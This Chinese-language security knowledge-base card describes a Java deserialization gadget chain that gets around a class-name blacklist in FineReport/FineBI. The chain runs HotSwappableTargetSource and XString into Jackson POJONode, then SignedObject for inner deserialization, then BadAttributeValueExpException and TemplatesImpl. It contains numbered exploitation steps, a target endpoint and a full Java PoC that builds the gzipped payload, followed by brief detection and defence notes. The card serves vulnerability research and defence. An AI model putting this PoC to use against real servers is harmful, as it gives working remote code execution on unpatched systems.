---
id: web-java-deser-hsts-xstring-pojonode-signedobject-inner-bave-templatesimpl
title: 黑名单同时封禁 BAVE/TemplatesImpl 的 Jackson 组合链：HotSwappableTargetSource+XString 触发 POJONode(SignedObject)，内层裸流反序列化 BAVE(POJONode(AOP TemplatesImpl))
type: scenario
domain: web
path: web/java/deserialization
technique: hsts-xstring-pojonode-signedobject-inner-bave-templatesimpl
tags:
- java
- deserialization
- jackson
- pojonode
- xstring
- hotswappabletargetsource
- signedobject
- badattributevalueexp
- templatesimpl
- spring-aop
- blacklist-bypass
- rce
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V589
  verified_at: '2026-11-12T14:19:31+08:00'
  notes: 已对照原文与10张截图核对：img07 BAVE.readObject/toString、img08 XString.equals→obj.toString、img09 HSTS.equals委托target.equals、img10 SignedObject.getObject内new ObjectInputStream二次反序列化，与卡内链路及PoC(含Javassist删BaseJsonNode.writeReplace、手工HashMap table、size=2、GZIP)一致。修正1处：JDK版本边界原文笼统，经本机javap核实JDK8/11 val为Object且未设SecurityManager时仍调toString，JDK15/17 val改为String、非String转identityHashCode@类名，已改写该bullet(知识库与staging同步)。dedup：与既有web-java-deserialization-blacklist-hotswappable-xstring-pojonode-spring-aop相比，旧卡前提是SignedObject/BAVE均不可用(封javax.swing/java.security+JDK17)，本卡前提是SignedObject可用而BAVE/TemplatesImpl被类名黑名单封禁，需SignedObject内层裸流偷渡BAVE+POJONode(AOP TemplatesImpl)，payload与外层sink均不同(trigram 0.3575, likely_duplicate但理由成立)；与jackson-signedobject-getobject-short-chain(EventListenerList外层)、bave-pojonode-signedobject-business-class(BAVE外层)嵌套方向不同。原文未标注版本，affected_versions保持空。
url: /docs/web/java/deserialization/web-java-deser-hsts-xstring-pojonode-signedobject-inner-bave-templatesimpl/
draft: false
kb_aliases:
- Jackson 组合绕过链
- HSTS XString SignedObject 嵌套链
- BAVE 与 TemplatesImpl 双封禁绕过
- 帆软 Jackson 黑名单绕过
- POJONode SignedObject 内层反序列化
---

## 一句话结论

当外层 `resolveClass` 黑名单同时封掉 `BadAttributeValueExpException`（BAVE）与 `TemplatesImpl`，且 `com.fr.third` 重打包的 Jackson/Spring 仍可用时，可用 HashMap 的两个 `HotSwappableTargetSource`（一个包 `POJONode(SignedObject(innerPayload))`、一个包 `XString`）制造哈希冲突：`HotSwappableTargetSource.equals → XString.equals → POJONode.toString → Jackson 序列化 → SignedObject.getObject()`；`getObject()` 新建的普通 `ObjectInputStream` 不受外层黑名单约束，内层再放 `BAVE(val=POJONode(AOP 代理的 TemplatesImpl))`，经 `toString → Jackson → getOutputProperties` 加载字节码 RCE。

## 原理

- **外层黑名单只作用于外层流**：入口继承 `ObjectInputStream` 重写 `resolveClass`，按类名拦截 BAVE、TemplatesImpl、hibernate、cb 等类；该检查只发生在当前流实例，`SignedObject.getObject()` 内部的 `new ObjectInputStream(...)` 是 JDK 原生流，内层类名不再受检。
- **HSTS 提供稳定的 HashMap 冲突键**：Spring 的 `HotSwappableTargetSource.hashCode()` 为类级常量，所有实例同哈希，HashMap 反序列化重建时必然走到 key 的 `equals`；其 `equals` 委托 `this.target.equals(other.target)`，于是可以让两个 target 分别是 `XString` 与恶意 `POJONode`。
- **XString 把 equals 桥接成 toString**：`com.sun.org.apache.xpath.internal.objects.XString.equals(obj)` 最终执行 `str().equals(obj.toString())`，对传入对象调用 `toString()`，从而进入 `POJONode.toString()`。
- **POJONode.toString 进入 Jackson 序列化**：`BaseJsonNode.toString() → InternalNodeMapper.nodeToString() → ObjectMapper.writeValueAsString()`，把 `_value` 当 POJO 序列化；Jackson 的 Bean 序列化会调用所有无参 getter。
- **SignedObject.getObject 是合法 getter**：`java.security.SignedObject` 的 `getObject()` 无参，Jackson 调用它时返回内层反序列化结果；`SignedObject` 构造时把任意 `Serializable` 写入 `content`，`getObject()` 用普通 OIS 读回——这就是二次反序列化入口。
- **内层复用经典 BAVE 链**：内层流无黑名单，可放 `BadAttributeValueExpException(val=POJONode(TemplatesImpl 的 Spring AOP 代理))`；JDK8 下 `BAVE.readObject` 对 val 调 `toString()`，`POJONode.toString → Jackson → JdkDynamicAopProxy → TemplatesImpl.getOutputProperties()`，加载 `_bytecodes` 中的 translet 执行命令。
- **JDK 版本边界**：JDK8/JDK11 的 `BadAttributeValueExpException.readObject` 在未设置 SecurityManager 时会对任意 val 调 `toString()`（JDK-8019292 修复只是增加 SecurityManager/基本类型包装判断）；JDK15+ 将 `val` 字段改为 `String`，非 String 一律转 `identityHashCode@类名`，BAVE 失去 toString 触发能力，需改用 EventListenerList/XString 等触发源。文章 FineBI/JDK8 环境可直接使用。
- **生成端处理**：Jackson 的 `BaseJsonNode.writeReplace()` 会在序列化 POJONode 时替换对象，必须用 Javassist 删除该方法（只影响生成端 JVM）；帆软将 Jackson/Spring 重打包为 `com.fr.third.fasterxml.jackson.*`、`com.fr.third.springframework.*`，payload 必须使用目标实际类名。

## 触发条件

- 存在原生反序列化入口，外层用 `resolveClass` 类名前缀黑名单，且已封禁 BAVE、TemplatesImpl、hibernate、commons-collections 等；但未封禁 `com.fr.third` 下的 Jackson/Spring、JDK 的 `XString`、`java.security.SignedObject`。
- classpath 含重打包 Jackson databind（`POJONode`）、Spring AOP（`HotSwappableTargetSource`、JdkDynamicAopProxy）与 Xalan `TemplatesImpl`。
- 运行在 JDK8（BAVE 仍会 toString）或等价未修复环境；或把内层触发源换成高版本可用的 EventListenerList/XString 组合。
- 入口要求 GZIP 时（帆软 channel），整体序列化数据需 GZIP 压缩。

## 利用步骤

1. 生成恶意 translet 字节码，构造 `TemplatesImpl` 并设置 `_bytecodes`、`_name`；用 Spring AOP 生成实现 `Templates` 接口的代理（`makeTemplatesImplAopProxy` 一类工具），使 Jackson 能看到并调用 `getOutputProperties` getter。
2. 生成端用 Javassist 删除 `com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode.writeReplace` 并重新加载，确保 POJONode 可正常序列化。
3. 构造内层 payload：`POJONode(AOP TemplatesImpl)` → 反射塞入 `BadAttributeValueExpException.val`；用 `SignedObject` 的构造器把该 BAVE 序列化进 `content`（需临时密钥对/签名算法）。
4. 构造外层：`node2 = POJONode(SignedObject)`；`h1 = HotSwappableTargetSource(node2)`、`h2 = HotSwappableTargetSource(new XString("xxx"))`。
5. 手工构造 `HashMap` 的 table：`size=2`，两个 `HashMap$Node`（hash 0）分别放 h1、h2；或正常 put 两个 HSTS（其 hashCode 为类常量，天然同桶）。
6. Java 序列化 HashMap；若入口是帆软 channel，再 GZIP 压缩后 POST 到 `/webroot/decision/remote/design/channel`。
7. 服务端反序列化：HashMap 重建 → HSTS.equals → XString.equals → POJONode.toString → Jackson → SignedObject.getObject → 内层 BAVE → POJONode(AOP TemplatesImpl).toString → Jackson → getOutputProperties → 命令执行。

## PoC

```java
TemplatesImpl t = utils.getTeml(evilBytes);
try {
    CtClass ctClass = ClassPool.getDefault()
        .get("com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode");
    CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
    ctClass.removeMethod(writeReplace);
    ctClass.toClass();
} catch (Exception ignored) {}

POJONode node = new POJONode(utils.makeTemplatesImplAopProxy(t));
BadAttributeValueExpException val = new BadAttributeValueExpException(null);
utils.setFieldValue(val, "val", node);

SignedObject s = utils.makeSignedObject(val);   // content = 序列化后的 BAVE
POJONode node2 = new POJONode(s);

HotSwappableTargetSource h1 = new HotSwappableTargetSource(node2);
HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

HashMap<Object, Object> hashmap = new HashMap<>();
utils.setFieldValue(hashmap, "size", 2);
Class<?> nodeC = Class.forName("java.util.HashMap$Node");
Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
nodeCons.setAccessible(true);
Object tbl = Array.newInstance(nodeC, 2);
Array.set(tbl, 0, nodeCons.newInstance(0, h1, h1, null));
Array.set(tbl, 1, nodeCons.newInstance(0, h2, h2, null));
utils.setFieldValue(hashmap, "table", tbl);

byte[] payload = utils.GzipCompress(utils.serialize(hashmap));
```

## 变体与关联

- **同触发源、直接 sink**：`web-java-deserialization-blacklist-hotswappable-xstring-pojonode-spring-aop` 用 HSTS+XString 直接接 `POJONode(AOP TemplatesImpl)`（无 SignedObject），适用于 TemplatesImpl/BAVE 未被同时封禁的环境；本卡在其外层再套 SignedObject，解决双封禁。
- **同 SignedObject 内层流、不同触发源**：`web-java-deserialization-jackson-signedobject-getobject-short-chain` 用 EventListenerList/UndoManager 触发 POJONode.toString；`web-java-deser-bave-pojonode-signedobject-business-class-readobject-ssrf-filewrite` 用 BAVE 外层触发、SignedObject 内层偷渡业务类。本卡是 HSTS/XString 外层触发 + SignedObject 内层偷渡 BAVE/TemplatesImpl 的嵌套组合。
- **Jackson/AOP 基础**：`jackson-native-deserialization-getter-tostring-templates-rce`、`web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17` 说明 POJONode.toString→Jackson getter→TemplatesImpl 的一般机制。
- **帆软入口**：同环境入口与版本差异见 `web-java-deserialization-finereport-channel-gzip-safeinvocation`；Hibernate 前置链见 `web-java-deser-hibernate-componenttype-getter-templatesimpl`。
- **高版本替代**：BAVE 在 JDK17 失效时，内层可换 `EventListenerList`/`XString` 触发 POJONode.toString。

## 检测与防御

- 检测：序列化流量中出现 `HotSwappableTargetSource`、`XString`、`POJONode`、`SignedObject`、`BadAttributeValueExpException` 的组合；尤其 SignedObject 的 `content` 字段中嵌套第二段序列化数据（`AC ED` 魔数）是二次反序列化的强特征。
- 防御：使用 `ObjectInputFilter`/JEP 290 白名单并对 SignedObject 等二次反序列化载体单独封禁；把黑名单下沉到所有新建的 ObjectInputStream（含 getObject、JRMP、RMI 等内部流）。
- 加固：升级 Jackson/Spring 版本无法根除该类链，核心是禁止不可信数据进入原生反序列化；帆软官方后续已把 SignedObject/Jackson 相关类加入黑名单，但仍应视为临时缓解。
